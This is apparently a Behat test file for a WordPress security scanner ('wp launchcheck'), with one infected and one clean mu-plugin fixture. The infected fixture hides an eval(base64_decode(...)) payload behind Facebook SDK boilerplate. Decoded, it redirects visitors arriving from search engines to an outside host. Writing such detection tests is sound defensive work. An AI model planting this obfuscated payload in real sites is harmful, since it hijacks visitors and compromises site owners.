Feature: Test WordPress for exploited files

  Scenario: A WordPress install with an exploited file
    Given a WP install
    And a wp-content/mu-plugins/exploited.php file:
      """
      <?php
        eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokcWF6cGxtPWhlYWRlcnNfc2VudCgpOwppZiAoISRxYXpwbG0pewokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107CiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwppZiAoJHVhZykgewppZiAoIXN0cmlzdHIoJHVhZywiTVNJRSA3LjAiKSBhbmQgIXN0cmlzdHIoJHVhZywiTVNJRSA2LjAiKSl7CmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7CmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7CmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9jdmtsYS4yNXUuY29tLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

        /**
        * Copyright 2011 Facebook, Inc.
        *
        * Licensed under the Apache License, Version 2.0 (the "License"); you may
        * not use this file except in compliance with the License. You may obtain
        * a copy of the License at
        *
        *     http://www.apache.org/licenses/LICENSE-2.0
        *
        * Unless required by applicable law or agreed to in writing, software
        * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
        * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
        * License for the specific language governing permissions and limitations
        * under the License.
        */

        if (!function_exists('curl_init')) {
          throw new Exception('Facebook needs the CURL PHP extension.');
        }
        if (!function_exists('json_decode')) {
          throw new Exception('Facebook needs the JSON PHP extension.');
        }

      """

    When I run `wp launchcheck all`
    Then STDOUT should contain:
      """
      Recommendation: You do not need to deactivate these files, but please scrutinize them in the event of a security issue.
      """

  Scenario: A WordPress install without an exploited file
    Given a WP install
    And a wp-content/mu-plugins/not-exploited.php file:
      """
      <?php

        /**
        * Copyright 2011 Facebook, Inc.
        *
        * Licensed under the Apache License, Version 2.0 (the "License"); you may
        * not use this file except in compliance with the License. You may obtain
        * a copy of the License at
        *
        *     http://www.apache.org/licenses/LICENSE-2.0
        *
        * Unless required by applicable law or agreed to in writing, software
        * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
        * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
        * License for the specific language governing permissions and limitations
        * under the License.
        */

        if (!function_exists('curl_init')) {
          throw new Exception('Facebook needs the CURL PHP extension.');
        }
        if (!function_exists('json_decode')) {
          throw new Exception('Facebook needs the JSON PHP extension.');
        }

      """

    When I run `wp launchcheck all`
    Then STDOUT should contain:
      """
      Recommendation: We did not find any files running risky functions.
      """
